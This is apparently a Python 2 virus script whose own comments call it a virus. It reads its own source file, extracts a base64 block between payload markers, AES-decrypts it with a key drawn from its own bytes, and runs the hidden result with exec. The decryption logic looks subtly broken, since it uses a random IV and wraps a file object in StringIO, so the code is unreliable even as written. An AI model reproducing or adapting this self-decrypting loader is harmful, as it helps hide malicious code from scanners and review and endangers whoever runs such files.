print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload